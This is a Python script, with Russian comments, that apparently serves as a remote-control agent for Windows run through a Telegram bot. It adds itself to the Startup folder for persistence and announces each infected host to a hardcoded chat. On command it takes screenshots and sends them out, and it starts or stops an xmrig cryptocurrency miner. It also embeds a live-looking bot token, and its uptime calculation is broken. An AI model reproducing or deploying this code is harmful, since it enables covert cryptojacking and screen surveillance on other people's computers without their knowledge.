import os
import sys
import json
import getpass
import subprocess
import psutil
import socket
import mss
import telebot
from datetime import timedelta
from threading import Thread

# ==== Настройки ====
BOT_TOKEN = "8108497510:AAE43G8iaKMmoL8bJMp7SmK5aQSwGMjGugo"
XMGRIG_EXE = "xmrig.exe"
CONFIG_FILE = "config.json"

bot = telebot.TeleBot(BOT_TOKEN)
devices = {socket.gethostname(): None}  # Здесь будет храниться информация о подключенных устройствах
mining_process = None  # Для управления майнером

# ==== Добавление в автозапуск Windows ====
def add_to_startup():
    username = getpass.getuser()
    startup_path = fr'C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
    script_name = os.path.basename(sys.argv[0])
    shortcut_path = os.path.join(startup_path, f'{os.path.splitext(script_name)[0]}.lnk')
    if not os.path.exists(shortcut_path):
        try:
            import winshell
            from win32com.client import Dispatch
            path = os.path.realpath(sys.argv[0])
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortcut(shortcut_path)
            shortcut.TargetPath = sys.executable
            shortcut.Arguments = f'"{path}"'
            shortcut.WorkingDirectory = os.path.dirname(path)
            shortcut.IconLocation = sys.executable
            shortcut.save()
        except Exception as e:
            print("Ошибка добавления в автозагрузку:", e)

# ==== Отправка сообщения при старте ====
def send_startup_message():
    bot.send_message(chat_id=YOUR_CHAT_ID, text=f"✅ Устройство `{socket.gethostname()}` успешно подключено!", parse_mode="Markdown")

# ==== Получаем данные о системе ====
def get_system_info():
    cpu = psutil.cpu_percent(interval=1)
    ram = psutil.virtual_memory().percent
    disk = psutil.disk_usage('/').percent
    net = psutil.net_io_counters()
    uptime = timedelta(seconds=int(psutil.boot_time()))
    return {
        'cpu': cpu,
        'ram': ram,
        'disk': disk,
        'net_sent': net.bytes_sent / (1024 ** 2),
        'net_recv': net.bytes_recv / (1024 ** 2),
        'uptime': str(uptime).split('.')[0]
    }

# ==== Управление майнером ====
def start_mining():
    global mining_process
    if mining_process is None or mining_process.poll() is not None:
        mining_process = subprocess.Popen([XMGRIG_EXE, "-c", CONFIG_FILE])

def stop_mining():
    global mining_process
    if mining_process and mining_process.poll() is None:
        mining_process.terminate()
        mining_process = None

def is_mining():
    return mining_process is not None and mining_process.poll() is None

# ==== Обработчики бота ====
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2)
    for device in devices:
        markup.add(telebot.types.KeyboardButton(device))
    bot.send_message(message.chat.id, "Выберите устройство:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text in devices)
def device_selected(message):
    chat_id = message.chat.id
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        telebot.types.InlineKeyboardButton("📸 Скриншот", callback_data="screenshot"),
        telebot.types.InlineKeyboardButton("📊 Статус", callback_data="status")
    )
    bot.send_message(chat_id, "Выберите действие:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "screenshot")
def take_screenshot(call):
    with mss.mss() as sct:
        filename = sct.shot(output="screenshot.png")
    with open(filename, 'rb') as photo:
        bot.send_photo(call.message.chat.id, photo)
    os.remove(filename)

@bot.callback_query_handler(func=lambda call: call.data == "status")
def system_status(call):
    info = get_system_info()
    status_text = (
        f"🖥️ Статус системы:\n"
        f"🧠 ЦП: {info['cpu']}%\n"
        f"💾 RAM: {info['ram']}%\n"
        f"📦 Диск: {info['disk']}%\n"
        f"📤 Сеть: ↑{info['net_sent']:.2f} МБ\n"
        f"📥 ↓{info['net_recv']:.2f} МБ\n"
        f"⏱ Аптайм: {info['uptime']}"
    )

    mining_status = "🟢 Майнинг: Включен" if is_mining() else "🔴 Майнинг: Выключен"
    status_text += f"\n⛏ {mining_status}"

    markup = telebot.types.InlineKeyboardMarkup()
    btn = telebot.types.InlineKeyboardButton(
        "❌ Выключить майнинг" if is_mining() else "✅ Включить майнинг",
        callback_data="toggle_mining"
    )
    markup.add(btn)

    bot.edit_message_text(status_text, chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "toggle_mining")
def toggle_mining(call):
    if is_mining():
        stop_mining()
    else:
        start_mining()
    system_status(call)

# ==== Основная функция ====
if __name__ == "__main__":
    add_to_startup()

    # Запрос ID чата
    YOUR_CHAT_ID = "1470225013"  # Автоматический ID

    # Сообщение о подключении
    send_startup_message()

    # Запуск бота в потоке
    Thread(target=bot.polling, kwargs={"none_stop": True}).start()